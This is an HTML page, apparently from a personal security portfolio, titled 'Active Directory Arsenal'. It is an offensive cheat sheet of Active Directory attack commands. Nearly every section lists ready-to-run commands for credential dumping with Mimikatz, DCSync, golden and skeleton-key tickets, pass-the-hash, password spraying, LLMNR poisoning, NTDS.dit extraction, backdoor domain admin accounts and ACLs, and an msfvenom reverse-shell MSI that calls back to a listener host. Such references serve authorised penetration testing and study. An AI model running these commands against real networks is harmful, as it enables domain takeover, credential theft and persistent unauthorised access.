@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory Arsenal - Yamashita</title>
+    <link rel="icon" type="image/x-icon" href="img/puffin_favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-red: #00ff9b;
+            --dark-bg: #0a0a0f;
+            --card-bg: #131318;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0b0;
+            --border-color: #1f1f2e;
+            --accent-gold: #00d4ff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--dark-bg) 0%, #001a0a 100%);
+            border-bottom: 2px solid var(--primary-red);
+            padding: 30px 0;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .header-title {
+            text-align: left;
+            flex: 1;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 24px;
+            background: transparent;
+            color: var(--primary-red);
+            border: 2px solid var(--primary-red);
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .back-link:hover {
+            background: var(--primary-red);
+            color: var(--dark-bg);
+            transform: translateX(-5px);
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: var(--primary-red);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .subtitle {
+            color: var(--accent-gold);
+            font-size: 1.1em;
+            font-style: italic;
+        }
+
+        .nav-tabs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: var(--card-bg);
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .tab-btn {
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            border: 2px solid var(--primary-red);
+            padding: 12px 24px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 0.95em;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .tab-btn:hover {
+            background: var(--primary-red);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(196, 30, 58, 0.4);
+        }
+
+        .tab-btn.active {
+            background: var(--primary-red);
+            color: white;
+        }
+
+        .section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-left: 4px solid var(--primary-red);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        h2 {
+            color: var(--primary-red);
+            font-size: 1.8em;
+            margin-bottom: 15px;
+            border-bottom: 2px solid var(--primary-red);
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: var(--accent-gold);
+            font-size: 1.4em;
+            margin-top: 20px;
+            margin-bottom: 15px;
+        }
+
+        h4 {
+            color: var(--text-primary);
+            font-size: 1.1em;
+            margin-top: 15px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        code {
+            background: var(--dark-bg);
+            color: #00ff00;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+
+        pre {
+            background: var(--dark-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 15px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            display: block;
+            color: #00ff00;
+        }
+
+        .command-box {
+            background: #000;
+            border: 2px solid var(--primary-red);
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+        }
+
+        .command-box .prompt {
+            color: var(--primary-red);
+            font-weight: bold;
+        }
+
+        .command-box .command {
+            color: #00ff00;
+        }
+
+        .warning {
+            background: rgba(196, 30, 58, 0.1);
+            border-left: 4px solid var(--primary-red);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+
+        .warning::before {
+            content: "⚠ WARNING: ";
+            color: var(--primary-red);
+            font-weight: bold;
+        }
+
+        .tip {
+            background: rgba(212, 175, 55, 0.1);
+            border-left: 4px solid var(--accent-gold);
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+
+        .tip::before {
+            content: "💡 TIP: ";
+            color: var(--accent-gold);
+            font-weight: bold;
+        }
+
+        .info {
+            background: rgba(0, 123, 255, 0.1);
+            border-left: 4px solid #007bff;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+
+        .info::before {
+            content: "ℹ INFO: ";
+            color: #007bff;
+            font-weight: bold;
+        }
+
+        ul, ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+        }
+
+        li {
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            background: var(--dark-bg);
+        }
+
+        th {
+            background: var(--primary-red);
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        td {
+            border: 1px solid var(--border-color);
+            padding: 10px;
+            color: var(--text-secondary);
+        }
+
+        tr:hover {
+            background: var(--card-bg);
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 15px;
+            background: var(--card-bg);
+            border: 2px solid var(--primary-red);
+            border-radius: 5px;
+            color: var(--text-primary);
+            font-size: 1em;
+            margin-bottom: 20px;
+        }
+
+        .search-box:focus {
+            outline: none;
+            border-color: var(--accent-gold);
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            margin-top: 50px;
+            border-top: 2px solid var(--primary-red);
+            color: var(--text-secondary);
+        }
+
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--primary-red);
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            font-size: 1.5em;
+            box-shadow: 0 4px 10px rgba(196, 30, 58, 0.5);
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+        }
+
+        .back-to-top:hover {
+            background: var(--accent-gold);
+        }
+
+        .attack-chain {
+            background: var(--dark-bg);
+            border: 2px solid var(--accent-gold);
+            border-radius: 5px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+
+        .attack-chain h4 {
+            color: var(--accent-gold);
+            margin-bottom: 15px;
+        }
+
+        .step {
+            background: var(--card-bg);
+            border-left: 3px solid var(--primary-red);
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 3px;
+        }
+
+        .step-number {
+            color: var(--primary-red);
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2em; }
+            .nav-tabs { flex-direction: column; }
+            .tab-btn { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <div class="header-title">
+                <h1>⚔️ Active Directory Arsenal ⚔️</h1>
+                <p class="subtitle">"Mastering the domain of Windows networks"</p>
+            </div>
+            <a href="index.html" class="back-link">
+                <span>← Back to Portfolio</span>
+            </a>
+        </div>
+    </header>
+
+    <div class="container">
+        <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search... (press 's' to focus)">
+
+        <div class="nav-tabs">
+            <button class="tab-btn active" onclick="showSection('overview')">AD Overview</button>
+            <button class="tab-btn" onclick="showSection('enumeration')">Enumeration</button>
+            <button class="tab-btn" onclick="showSection('kerberos')">Kerberos Attacks</button>
+            <button class="tab-btn" onclick="showSection('lateral')">Lateral Movement</button>
+            <button class="tab-btn" onclick="showSection('persistence')">Persistence</button>
+            <button class="tab-btn" onclick="showSection('privesc')">Privilege Escalation</button>
+            <button class="tab-btn" onclick="showSection('passwords')">Password Attacks</button>
+            <button class="tab-btn" onclick="showSection('tools')">Tools & Commands</button>
+        </div>
+        <!-- OVERVIEW SECTION -->
+        <div id="overview" class="section active">
+            <div class="card">
+                <h2>🏰 Active Directory Overview</h2>
+                
+                <h3>Core Components</h3>
+                <table>
+                    <tr>
+                        <th>Component</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Domain Controller</strong></td>
+                        <td>Hosts AD database, handles authentication</td>
+                    </tr>
+                    <tr>
+                        <td><strong>NTDS.dit</strong></td>
+                        <td>Database with all AD objects & password hashes</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Kerberos</strong></td>
+                        <td>Primary authentication protocol</td>
+                    </tr>
+                    <tr>
+                        <td><strong>LDAP</strong></td>
+                        <td>Directory access protocol (port 389/636)</td>
+                    </tr>
+                </table>
+
+                <h3>Attack Path Overview</h3>
+                <div class="attack-chain">
+                    <h4>Typical Compromise Chain</h4>
+                    <div class="step"><span class="step-number">1.</span> Initial Access (phishing, default creds)</div>
+                    <div class="step"><span class="step-number">2.</span> Enumeration (users, groups, SPNs)</div>
+                    <div class="step"><span class="step-number">3.</span> Credential Access (Kerberoasting, LLMNR)</div>
+                    <div class="step"><span class="step-number">4.</span> Lateral Movement (PsExec, WinRM, RDP)</div>
+                    <div class="step"><span class="step-number">5.</span> Privilege Escalation (token impersonation)</div>
+                    <div class="step"><span class="step-number">6.</span> Domain Dominance (DCSync, Golden Ticket)</div>
+                </div>
+
+                <h3>High-Value Groups</h3>
+                <ul>
+                    <li><strong>Domain Admins</strong> - Full domain control</li>
+                    <li><strong>Enterprise Admins</strong> - Full forest control</li>
+                    <li><strong>Backup Operators</strong> - Can backup/restore files</li>
+                    <li><strong>Account Operators</strong> - Can modify user accounts</li>
+                    <li><strong>DnsAdmins</strong> - Can load DLLs on DC (privesc)</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- ENUMERATION SECTION -->
+        <div id="enumeration" class="section">
+            <div class="card">
+                <h2>🔍 Enumeration</h2>
+                
+                <h3>PowerView - Domain Enumeration</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Get-Domain</span><br>
+                    <span class="prompt">PS></span> <span class="command">Get-DomainController</span><br>
+                    <span class="prompt">PS></span> <span class="command">Get-DomainUser | select samaccountname</span><br>
+                    <span class="prompt">PS></span> <span class="command">Get-DomainUser -SPN</span><br>
+                    <span class="prompt">PS></span> <span class="command">Get-DomainGroup "Domain Admins" | Get-DomainGroupMember</span><br>
+                    <span class="prompt">PS></span> <span class="command">Get-DomainComputer | select dnshostname</span><br>
+                    <span class="prompt">PS></span> <span class="command">Get-DomainGPO</span><br>
+                    <span class="prompt">PS></span> <span class="command">Find-DomainShare -CheckShareAccess</span>
+                </div>
+
+                <h3>BloodHound Collection</h3>
+                <div class="tip">
+                    BloodHound visualizes attack paths and relationships in AD
+                </div>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Import-Module SharpHound.ps1</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-BloodHound -CollectionMethod All</span><br>
+                    <span class="prompt">$</span> <span class="command">bloodhound-python -d domain.local -u user -p pass -c all -ns 10.10.10.10</span><br>
+                    <span class="prompt">$</span> <span class="command">./SharpHound.exe -c All</span>
+                </div>
+
+                <h3>LDAP Enumeration</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"</span><br>
+                    <span class="prompt">$</span> <span class="command">ldapdomaindump -u 'domain\user' -p password 10.10.10.10</span>
+                </div>
+
+                <h3>SMB Enumeration</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">enum4linux -a 10.10.10.10</span><br>
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb 10.10.10.0/24</span><br>
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb 10.10.10.10 -u user -p pass --shares</span><br>
+                    <span class="prompt">$</span> <span class="command">smbclient -L //10.10.10.10 -U username</span>
+                </div>
+
+                <h3>Native Windows Commands</h3>
+                <div class="command-box">
+                    <span class="prompt">C:\></span> <span class="command">net user /domain</span><br>
+                    <span class="prompt">C:\></span> <span class="command">net group "Domain Admins" /domain</span><br>
+                    <span class="prompt">C:\></span> <span class="command">net accounts /domain</span><br>
+                    <span class="prompt">C:\></span> <span class="command">nltest /domain_trusts</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- KERBEROS SECTION -->
+        <div id="kerberos" class="section">
+            <div class="card">
+                <h2>🎫 Kerberos Attacks</h2>
+                
+                <h3>Kerberoasting</h3>
+                <div class="info">
+                    Request service tickets for SPN accounts, crack offline
+                </div>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Get-DomainUser -SPN</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-Kerberoast -OutputFormat Hashcat</span><br>
+                    <span class="prompt">PS></span> <span class="command">Rubeus.exe kerberoast /outfile:hashes.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request</span><br>
+                    <span class="prompt">$</span> <span class="command">hashcat -m 13100 hashes.txt wordlist.txt</span>
+                </div>
+
+                <h3>AS-REP Roasting</h3>
+                <div class="info">
+                    Attack users with "Do not require Kerberos preauthentication"
+                </div>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Get-DomainUser -PreauthNotRequired</span><br>
+                    <span class="prompt">PS></span> <span class="command">Rubeus.exe asreproast /format:hashcat</span><br>
+                    <span class="prompt">$</span> <span class="command">GetNPUsers.py domain.local/ -usersfile users.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">hashcat -m 18200 hashes.txt wordlist.txt</span>
+                </div>
+
+                <h3>Golden Ticket</h3>
+                <div class="warning">
+                    Requires krbtgt hash - provides persistent DA access
+                </div>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt"'</span>
+                </div>
+
+                <h3>Silver Ticket</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /ptt"'</span>
+                </div>
+
+                <h3>Pass-the-Ticket</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Rubeus.exe ptt /ticket:ticket.kirbi</span><br>
+                    <span class="prompt">$</span> <span class="command">export KRB5CCNAME=ticket.ccache</span>
+                </div>
+
+                <h3>Overpass-the-Hash</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Rubeus.exe asktgt /user:admin /rc4:HASH /ptt</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH"'</span>
+                </div>
+
+                <h3>Unconstrained Delegation</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Get-DomainComputer -Unconstrained</span><br>
+                    <span class="prompt">PS></span> <span class="command">Rubeus.exe monitor /interval:5</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- LATERAL MOVEMENT SECTION -->
+        <div id="lateral" class="section">
+            <div class="card">
+                <h2>🔄 Lateral Movement</h2>
+                
+                <h3>Pass-the-Hash</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb 10.10.10.10 -u admin -H HASH</span><br>
+                    <span class="prompt">$</span> <span class="command">evil-winrm -i 10.10.10.10 -u admin -H HASH</span><br>
+                    <span class="prompt">$</span> <span class="command">impacket-psexec -hashes :HASH admin@10.10.10.10</span><br>
+                    <span class="prompt">$</span> <span class="command">impacket-wmiexec -hashes :HASH admin@10.10.10.10</span>
+                </div>
+
+                <h3>PsExec</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">impacket-psexec domain.local/user:pass@10.10.10.10</span><br>
+                    <span class="prompt">C:\></span> <span class="command">PsExec.exe \\10.10.10.10 -u domain\user -p pass cmd</span>
+                </div>
+
+                <h3>WMI Execution</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">impacket-wmiexec domain.local/user:pass@10.10.10.10</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "cmd" -ComputerName 10.10.10.10</span>
+                </div>
+
+                <h3>WinRM / PowerShell Remoting</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">evil-winrm -i 10.10.10.10 -u user -p pass</span><br>
+                    <span class="prompt">PS></span> <span class="command">Enter-PSSession -ComputerName server01</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-Command -ComputerName server01 -ScriptBlock {whoami}</span>
+                </div>
+
+                <h3>RDP</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">xfreerdp /u:admin /p:pass /v:10.10.10.10</span><br>
+                    <span class="prompt">$</span> <span class="command">xfreerdp /u:admin /pth:HASH /v:10.10.10.10</span>
+                </div>
+
+                <h3>CrackMapExec Spray</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb 10.10.10.0/24 -u user -p pass</span><br>
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb 10.10.10.0/24 -u user -H HASH --local-auth</span><br>
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb 10.10.10.0/24 -u user -p pass -x "whoami"</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PERSISTENCE SECTION -->
+        <div id="persistence" class="section">
+            <div class="card">
+                <h2>🔒 Persistence</h2>
+                
+                <h3>Golden Ticket Persistence</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"kerberos::golden /user:Admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt"'</span>
+                </div>
+
+                <h3>Skeleton Key</h3>
+                <div class="warning">
+                    Patches LSASS on DC - requires reboot to remove
+                </div>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc.domain.local</span>
+                </div>
+
+                <h3>AdminSDHolder Abuse</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity backdoor -Rights All</span>
+                </div>
+
+                <h3>Malicious GPO</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">New-GPO -Name "Backdoor" | New-GPLink -Target "DC=domain,DC=local"</span>
+                </div>
+
+                <h3>ACL Backdoors</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity backdoor -Rights All</span><br>
+                    <span class="prompt">PS></span> <span class="command">Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity backdoor -Rights DCSync</span>
+                </div>
+
+                <h3>Backdoor User</h3>
+                <div class="command-box">
+                    <span class="prompt">C:\></span> <span class="command">net user backdoor P@ssw0rd /add /domain</span><br>
+                    <span class="prompt">C:\></span> <span class="command">net group "Domain Admins" backdoor /add /domain</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PRIVILEGE ESCALATION SECTION -->
+        <div id="privesc" class="section">
+            <div class="card">
+                <h2>⬆️ Privilege Escalation</h2>
+                
+                <h3>Automated Enumeration</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">. .\PowerUp.ps1; Invoke-AllChecks</span><br>
+                    <span class="prompt">PS></span> <span class="command">.\winPEAS.exe</span><br>
+                    <span class="prompt">PS></span> <span class="command">.\Seatbelt.exe -group=all</span>
+                </div>
+
+                <h3>Token Impersonation (SeImpersonate)</h3>
+                <div class="command-box">
+                    <span class="prompt">C:\></span> <span class="command">whoami /priv</span><br>
+                    <span class="prompt">C:\></span> <span class="command">.\PrintSpoofer.exe -i -c cmd</span><br>
+                    <span class="prompt">C:\></span> <span class="command">.\RoguePotato.exe -r 10.10.10.10 -e cmd</span>
+                </div>
+
+                <h3>AlwaysInstallElevated</h3>
+                <div class="command-box">
+                    <span class="prompt">C:\></span> <span class="command">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br>
+                    <span class="prompt">$</span> <span class="command">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi > shell.msi</span><br>
+                    <span class="prompt">C:\></span> <span class="command">msiexec /quiet /qn /i shell.msi</span>
+                </div>
+
+                <h3>Unquoted Service Paths</h3>
+                <div class="command-box">
+                    <span class="prompt">C:\></span> <span class="command">wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """</span>
+                </div>
+
+                <h3>GPP Passwords</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Get-GPPPassword</span><br>
+                    <span class="prompt">$</span> <span class="command">gpp-decrypt [encrypted_password]</span>
+                </div>
+
+                <h3>SAM/SYSTEM Extraction</h3>
+                <div class="command-box">
+                    <span class="prompt">C:\></span> <span class="command">reg save HKLM\SAM SAM</span><br>
+                    <span class="prompt">C:\></span> <span class="command">reg save HKLM\SYSTEM SYSTEM</span><br>
+                    <span class="prompt">$</span> <span class="command">impacket-secretsdump -sam SAM -system SYSTEM LOCAL</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PASSWORD ATTACKS SECTION -->
+        <div id="passwords" class="section">
+            <div class="card">
+                <h2>🔑 Password Attacks</h2>
+                
+                <h3>Password Spraying</h3>
+                <div class="tip">
+                    Try common passwords against all users - check lockout policy first!
+                </div>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123!'</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-DomainPasswordSpray -UserList users.txt -Password Password123!</span><br>
+                    <span class="prompt">$</span> <span class="command">kerbrute passwordspray -d domain.local users.txt 'Password123!'</span>
+                </div>
+
+                <h3>LLMNR/NBT-NS Poisoning</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">responder -I eth0 -wrf</span><br>
+                    <span class="prompt">$</span> <span class="command">hashcat -m 5600 hashes.txt wordlist.txt</span>
+                </div>
+
+                <h3>SMB Relay</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">impacket-ntlmrelayx -tf targets.txt -smb2support</span><br>
+                    <span class="prompt">$</span> <span class="command">impacket-ntlmrelayx -t ldap://dc.domain.local --escalate-user lowpriv</span>
+                </div>
+
+                <h3>Hash Cracking</h3>
+                <div class="command-box">
+                    <span class="prompt">$</span> <span class="command">hashcat -m 1000 ntlm_hashes.txt rockyou.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">hashcat -m 13100 tgs_hashes.txt rockyou.txt</span><br>
+                    <span class="prompt">$</span> <span class="command">hashcat -m 18200 asrep_hashes.txt rockyou.txt</span>
+                </div>
+
+                <h3>Mimikatz Credential Dumping</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'</span><br>
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -DumpCreds</span><br>
+                    <span class="prompt">C:\></span> <span class="command">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit</span>
+                </div>
+
+                <h3>DCSync Attack</h3>
+                <div class="command-box">
+                    <span class="prompt">PS></span> <span class="command">Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'</span><br>
+                    <span class="prompt">$</span> <span class="command">secretsdump.py domain.local/admin@dc.domain.local -just-dc</span>
+                </div>
+
+                <h3>NTDS.dit Extraction</h3>
+                <div class="command-box">
+                    <span class="prompt">C:\></span> <span class="command">ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q</span><br>
+                    <span class="prompt">$</span> <span class="command">impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</span><br>
+                    <span class="prompt">$</span> <span class="command">crackmapexec smb dc.domain.local -u admin -p pass --ntds</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- TOOLS SECTION -->
+        <div id="tools" class="section">
+            <div class="card">
+                <h2>🛠️ Essential Tools</h2>
+                
+                <h3>Enumeration Tools</h3>
+                <ul>
+                    <li><strong>PowerView</strong> - PowerShell AD enumeration (part of PowerSploit)</li>
+                    <li><strong>BloodHound</strong> - AD attack path visualization</li>
+                    <li><strong>SharpHound</strong> - BloodHound data collector</li>
+                    <li><strong>ADRecon</strong> - Comprehensive AD enumeration</li>
+                    <li><strong>ldapdomaindump</strong> - LDAP enumeration tool</li>
+                    <li><strong>enum4linux</strong> - Linux SMB enumeration</li>
+                </ul>
+
+                <h3>Exploitation Tools</h3>
+                <ul>
+                    <li><strong>Mimikatz</strong> - Credential dumping, ticket manipulation</li>
+                    <li><strong>Rubeus</strong> - Kerberos abuse toolkit</li>
+                    <li><strong>Impacket</strong> - Python SMB/MSRPC toolkit</li>
+                    <li><strong>CrackMapExec</strong> - Network enumeration and exploitation</li>
+                    <li><strong>Evil-WinRM</strong> - WinRM shell</li>
+                    <li><strong>Responder</strong> - LLMNR/NBT-NS poisoning</li>
+                </ul>
+
+                <h3>Privilege Escalation</h3>
+                <ul>
+                    <li><strong>PowerUp</strong> - Windows privilege escalation checker</li>
+                    <li><strong>winPEAS</strong> - Automated enumeration</li>
+                    <li><strong>Seatbelt</strong> - Security posture enumeration</li>
+                    <li><strong>PrintSpoofer</strong> - SeImpersonate exploitation</li>
+                    <li><strong>RoguePotato</strong> - Token impersonation</li>
+                </ul>
+
+                <h3>Essential Commands Quick Reference</h3>
+                <table>
+                    <tr>
+                        <th>Task</th>
+                        <th>Command</th>
+                    </tr>
+                    <tr>
+                        <td>Find DCs</td>
+                        <td><code>nltest /dclist:domain.local</code></td>
+                    </tr>
+                    <tr>
+                        <td>List users</td>
+                        <td><code>net user /domain</code></td>
+                    </tr>
+                    <tr>
+                        <td>List Domain Admins</td>
+                        <td><code>net group "Domain Admins" /domain</code></td>
+                    </tr>
+                    <tr>
+                        <td>Password policy</td>
+                        <td><code>net accounts /domain</code></td>
+                    </tr>
+                    <tr>
+                        <td>Trust relationships</td>
+                        <td><code>nltest /domain_trusts</code></td>
+                    </tr>
+                    <tr>
+                        <td>Current user</td>
+                        <td><code>whoami /all</code></td>
+                    </tr>
+                </table>
+
+                <div class="tip">
+                    Always start with BloodHound for comprehensive attack path analysis!
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="back-to-top" id="backToTop" onclick="scrollToTop()">↑</div>
+
+    <footer>
+        <p>© 2025 Yamashita - Cyber Samurai | Active Directory Arsenal</p>
+        <p><em>"In the domain, as in battle, knowledge is power."</em></p>
+    </footer>
+
+    <script>
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
+            event.target.classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        document.getElementById('searchBox').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            document.querySelectorAll('.section').forEach(section => {
+                const content = section.textContent.toLowerCase();
+                section.style.display = content.includes(searchTerm) || searchTerm === '' ? 'block' : 'none';
+            });
+        });
+
+        window.addEventListener('scroll', function() {
+            const backToTop = document.getElementById('backToTop');
+            backToTop.classList.toggle('visible', window.pageYOffset > 300);
+        });
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        document.querySelectorAll('pre code').forEach(block => {
+            block.addEventListener('click', function() {
+                navigator.clipboard.writeText(this.textContent);
+                const original = this.style.background;
+                this.style.background = 'rgba(212, 175, 55, 0.2)';
+                setTimeout(() => { this.style.background = original; }, 200);
+            });
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 's' && document.activeElement !== document.getElementById('searchBox')) {
+                e.preventDefault();
+                document.getElementById('searchBox').focus();
+            }
+            if (e.key === 'Escape') {
+                document.getElementById('searchBox').value = '';
+                document.getElementById('searchBox').dispatchEvent(new Event('input'));
+            }
+        });
+    </script>
+</body>
+</html>
